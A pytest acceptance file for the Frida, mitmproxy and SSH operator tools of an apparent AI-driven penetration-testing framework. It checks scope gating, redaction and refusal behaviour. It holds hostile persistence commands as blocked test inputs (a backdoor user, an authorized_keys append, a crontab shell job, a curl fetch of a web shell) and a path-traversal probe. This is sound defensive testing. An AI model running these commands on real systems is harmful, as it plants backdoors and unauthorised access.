"""P4 acceptance — REFACTOR-05 final disposition (operator-attached
runtimes).

The three tools deferred from P3: frida_hook, mitm_intercept,
ssh_interactive_exec. Acceptance per the P4 contract:
  * missing runtimes refuse HONESTLY (operator-attachment message,
    never a fabricated result);
  * present runtimes (fakes on PATH) launch under the bounded-subprocess
    discipline: process groups, capture-window kill, output harvest;
  * ssh scope-gates the target (deny-by-default) and runs the PoC-only
    persistence battery before execution;
  * the registry composes: include flags + AEGIS_OPERATOR_TOOLS trim;
  * credential redaction on the ssh result path.
"""
import asyncio
import json
import os
import sys
from pathlib import Path

import pytest

HERE = Path(__file__).parent
sys.path.insert(0, str(HERE))
sys.path.insert(0, str(HERE.parent))

from hypervisor.adapters.openai import frozen_json  # noqa: E402
from hypervisor.permissions import (PermissionEngine,  # noqa: E402
                                    ScopeFile, ScopeManager)
from hypervisor.tools.base import ToolContext, dispatch_tools  # noqa: E402
from hypervisor.tools.core import build_registry  # noqa: E402


@pytest.fixture()
def env(tmp_path):
    scope = {
        "version": 1, "engagement_id": "T", "mode": "strict",
        "targets": [{"target": "10.10.0.0/24"}],
        "excludes": [], "roe": {"poc_only": True},
    }
    import hashlib
    fp = hashlib.sha256(frozen_json(scope).encode()).hexdigest()
    scope["authorization"] = {"signed_sha256": fp}
    d = Path(tmp_path) / "scope"
    d.mkdir()
    (d / "scope.json").write_text(json.dumps(scope))
    sm = ScopeManager(ScopeFile.load(d / "scope.json"))
    ws = Path(tmp_path) / "ws"
    ws.mkdir()
    reg = build_registry(include_vapt=True, include_task=True)
    ctx = ToolContext(workspace=str(ws), registry=reg,
                      permissions=PermissionEngine(sm))
    return ctx, reg, sm, ws


def call(ctx, name, args, cid="c1"):
    return asyncio.run(dispatch_tools(
        [{"type": "tool_use", "id": cid, "name": name, "input": args}],
        ctx))[0]


FAKE_FRIDA = """#!/bin/sh
echo '[*] API Monitor Active'
echo '[URL] http://10.10.0.5/api/v1/login'
sleep 30
"""
FAKE_MITMDUMP = """#!/bin/sh
echo 'Proxy server listening'
echo '[REQ] GET http://10.10.0.5/app'
sleep 30
"""
FAKE_SSH = """#!/bin/sh
echo 'remote-output: ok'
echo 'uid=0(root) gid=0(root)'
exit 0
"""
FAKE_SSHPASS = """#!/bin/sh
shift 2 2>/dev/null
exec "$@"
"""


@pytest.fixture()
def fakes(tmp_path, monkeypatch):
    bindir = tmp_path / "bin"
    bindir.mkdir(exist_ok=True)
    for name, body in (("frida", FAKE_FRIDA),
                       ("mitmdump", FAKE_MITMDUMP),
                       ("ssh", FAKE_SSH),
                       ("sshpass", FAKE_SSHPASS)):
        p = bindir / name
        p.write_text(body)
        p.chmod(0o755)
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep +
                       os.environ.get("PATH", ""))
    return bindir


# ─── honest refusal when the runtime is not attached ────────────────────

def test_frida_missing_runtime_refuses_honestly(env, monkeypatch):
    ctx, reg, sm, ws = env
    monkeypatch.setenv("PATH", "/nonexistent")
    res = call(ctx, "frida_hook",
               {"package_name": "com.lab.app", "duration": 3})
    assert res["is_error"]
    assert "operator runtime not attached" in res["content"]
    assert "frida" in res["content"]


def test_mitm_missing_runtime_refuses_honestly(env, monkeypatch):
    ctx, reg, sm, ws = env
    monkeypatch.setenv("PATH", "/nonexistent")
    res = call(ctx, "mitm_intercept", {"port": 18082, "duration": 3})
    assert res["is_error"]
    assert "mitmdump" in res["content"]


def test_ssh_missing_runtime_refuses_honestly(env, monkeypatch):
    ctx, reg, sm, ws = env
    monkeypatch.setenv("PATH", "/nonexistent")
    res = call(ctx, "ssh_interactive_exec",
               {"target_ip": "10.10.0.5", "username": "root",
                "command": "id"})
    assert res["is_error"]
    assert "ssh" in res["content"]


# ─── bounded capture windows with the fakes attached ────────────────────

def test_frida_capture_window_harvests_and_kills(env, fakes):
    ctx, reg, sm, ws = env
    res = call(ctx, "frida_hook",
               {"package_name": "com.lab.app",
                "hook_type": "api_monitor", "duration": 3})
    assert not res["is_error"]
    assert "API Monitor Active" in res["content"]
    assert "capture window closed" in res["content"]


# A frida CLI mimic for current frida-tools: records its argv, rejects
# the REMOVED --no-pause flag exactly like the engagement image's real
# binary did (Test-4), otherwise streams the API-monitor battery.
FRIDA17_MIMIC = """#!/bin/sh
echo "$@" > "$FRIDA_ARGV_RECORD"
for a in "$@"; do
    if [ "$a" = "--no-pause" ]; then
        echo "usage: frida [options] target"
        echo "frida: error: unrecognized arguments: --no-pause"
        exit 2
    fi
done
echo '[*] API Monitor Active'
echo '[URL] http://10.10.0.5/api/v1/login'
sleep 30
"""


def test_frida_argv_omits_the_removed_no_pause_flag(
        env, tmp_path, monkeypatch):
    """Test-4 regression: the clean engagement container's real frida
    (current frida-tools) rejects --no-pause outright, so the
    oracle-era flag made every LIVE frida_hook harvest a usage error
    instead of hooking. The argv must keep the spawn/script shape and
    carry no --no-pause."""
    ctx, reg, sm, ws = env
    bindir = tmp_path / "frida17"
    bindir.mkdir()
    rec = tmp_path / "argv.txt"
    p = bindir / "frida"
    p.write_text(FRIDA17_MIMIC)
    p.chmod(0o755)
    monkeypatch.setenv("PATH", str(bindir) + os.pathsep +
                       os.environ.get("PATH", ""))
    monkeypatch.setenv("FRIDA_ARGV_RECORD", str(rec))
    res = call(ctx, "frida_hook",
               {"package_name": "com.lab.app",
                "hook_type": "api_monitor", "duration": 3})
    assert not res["is_error"]
    assert "API Monitor Active" in res["content"]    # hooks streamed
    assert "unrecognized arguments" not in res["content"]
    argv = rec.read_text().split()
    assert "--no-pause" not in argv                  # the fix
    assert "-f" in argv and "com.lab.app" in argv    # spawn shape kept
    assert "-l" in argv                              # script battery kept


def test_frida_script_battery_is_the_oracle_port(env):
    from hypervisor.tools.vapt.operator import FRIDA_SCRIPTS
    assert set(FRIDA_SCRIPTS) == {"ssl_pinning", "root_detect",
                                  "crypto_intercept", "api_monitor"}
    # spot anchors from the oracle's battery (byte-ported)
    assert "OkHttp3 CertificatePinner" in FRIDA_SCRIPTS["ssl_pinning"]
    assert "TrustManagerImpl" in FRIDA_SCRIPTS["ssl_pinning"]
    assert "rootbeer" in FRIDA_SCRIPTS["root_detect"]
    assert "SecretKeySpec" in FRIDA_SCRIPTS["crypto_intercept"]
    assert "OkHttpClient" in FRIDA_SCRIPTS["api_monitor"]


def test_frida_custom_script_resolved_through_the_gate(env, fakes):
    ctx, reg, sm, ws = env
    # traversal: a custom script outside the workspace must be refused
    res = call(ctx, "frida_hook",
               {"package_name": "com.lab.app", "hook_type": "custom",
                "script_path": "../../etc/passwd", "duration": 3})
    assert res["is_error"]
    assert "outside the engagement workspace" in res["content"]


def test_mitm_capture_window_and_configuration(env, fakes):
    ctx, reg, sm, ws = env
    res = call(ctx, "mitm_intercept", {"port": 18082, "duration": 3})
    assert not res["is_error"]
    assert "[REQ] GET http://10.10.0.5/app" in res["content"]
    assert "proxy configuration" in res["content"]
    assert "http://mitm.it" in res["content"]


def test_mitm_addon_script_is_the_oracle_port(env):
    from hypervisor.tools.vapt.operator import MITM_ADDON_SCRIPT
    assert "InterceptApp" in MITM_ADDON_SCRIPT
    assert "[REQ-H]" in MITM_ADDON_SCRIPT
    assert "[RES-B]" in MITM_ADDON_SCRIPT


# ─── ssh: scope gate + RoE battery + credential redaction ───────────────

def test_ssh_out_of_scope_target_denied(env, fakes):
    ctx, reg, sm, ws = env
    res = call(ctx, "ssh_interactive_exec",
               {"target_ip": "192.168.99.99", "username": "root",
                "command": "id"})
    assert res["is_error"]
    assert "PERMISSION DENIED" in res["content"]


def test_ssh_in_scope_runs_and_captures(env, fakes):
    ctx, reg, sm, ws = env
    res = call(ctx, "ssh_interactive_exec",
               {"target_ip": "10.10.0.5", "username": "root",
                "command": "id", "timeout": 20})
    assert not res["is_error"]
    assert "remote-output: ok" in res["content"]
    assert "uid=0(root)" in res["content"]


def test_ssh_persistence_battery_refuses_before_execution(env, fakes):
    ctx, reg, sm, ws = env
    for bad in ("useradd backdoor",
                "echo x >> /root/.ssh/authorized_keys",
                "crontab -l; echo '* * * * * /bin/sh -c x' | crontab -",
                "curl http://x/shell.php > /var/www/html/wso.php"):
        res = call(ctx, "ssh_interactive_exec",
                   {"target_ip": "10.10.0.5", "username": "root",
                    "command": bad})
        assert res["is_error"], bad
        assert "PoC-only" in res["content"], bad


def test_ssh_password_auth_requires_sshpass(env, fakes, monkeypatch):
    ctx, reg, sm, ws = env
    # drop only sshpass from the fake bin dir
    (fakes / "sshpass").unlink()
    # isolate PATH: the container's real sshpass would otherwise
    # satisfy the runtime check one directory later
    monkeypatch.setenv("PATH", str(fakes))
    res = call(ctx, "ssh_interactive_exec",
               {"target_ip": "10.10.0.5", "username": "root",
                "command": "id", "password": "hunter2"})
    assert res["is_error"]
    assert "sshpass" in res["content"]


def test_ssh_password_redacted_from_result(env, fakes):
    ctx, reg, sm, ws = env
    # simulate a remote that echoes the password back (prompt noise):
    # the result path must redact it before the model ever sees it
    (fakes / "ssh").write_text(
        '#!/bin/sh\necho "Password: s3cret-pw"\necho done\n')
    (fakes / "ssh").chmod(0o755)
    res = call(ctx, "ssh_interactive_exec",
               {"target_ip": "10.10.0.5", "username": "root",
                "command": "id", "password": "s3cret-pw"})
    assert not res["is_error"]
    assert "s3cret-pw" not in res["content"]
    assert "[redacted-credential]" in res["content"]


def test_ssh_hardened_options_present(env, fakes):
    ctx, reg, sm, ws = env
    seen = {}

    def fake_dispatch(ctx2, name, args, cid="c1"):
        return asyncio.run(dispatch_tools(
            [{"type": "tool_use", "id": cid, "name": name,
              "input": args}], ctx2))[0]

    # capture the argv the tool built by wrapping the fake ssh
    (fakes / "ssh").write_text(
        '#!/bin/sh\nfor a in "$@"; do echo "ARG:$a"; done\n')
    (fakes / "ssh").chmod(0o755)
    res = fake_dispatch(ctx, "ssh_interactive_exec",
                        {"target_ip": "10.10.0.5", "username": "root",
                         "command": "id"})
    seen["content"] = res["content"]
    assert not res["is_error"]
    out = seen["content"]
    assert "ForwardAgent=no" in out
    assert "ClearAllForwardings=yes" in out
    assert "StrictHostKeyChecking=accept-new" in out
    assert "ConnectTimeout=15" in out


# ─── registry composition ────────────────────────────────────────────────

def test_operator_tools_in_full_registry(env):
    ctx, reg, sm, ws = env
    names = reg.names()
    for n in ("frida_hook", "mitm_intercept", "ssh_interactive_exec"):
        assert n in names, n


def test_operator_tools_trimmed_by_env(env, monkeypatch):
    monkeypatch.setenv("AEGIS_OPERATOR_TOOLS", "0")
    reg = build_registry(include_vapt=True)
    names = reg.names()
    assert "frida_hook" not in names
    assert "ssh_interactive_exec" not in names
    # the rest of the VAPT family stands
    assert "network_scan_nmap" in names


def test_operator_tools_not_in_platform_set(env):
    reg = build_registry()
    assert "frida_hook" not in reg.names()


def test_operator_classes_and_targets(env):
    from hypervisor.permissions import SafetyClass
    from hypervisor.tools.vapt.operator import (FridaHookTool,
                                                MitmInterceptTool,
                                                SshExecTool)
    f, m, s = FridaHookTool(), MitmInterceptTool(), SshExecTool()
    assert f.safety_class({}) is SafetyClass.EXPLOIT
    assert m.safety_class({}) is SafetyClass.EXPLOIT
    assert s.safety_class({}) is SafetyClass.EXPLOIT
    # ssh extracts the connection target for the scope gate (the
    # bare-host convention every P3 tool uses)
    assert s.extract_targets({"target_ip": "10.10.0.5",
                              "port": 22}) == ["10.10.0.5"]
    assert not f.concurrency_safe({})
    assert not m.concurrency_safe({})
    assert not s.concurrency_safe({})
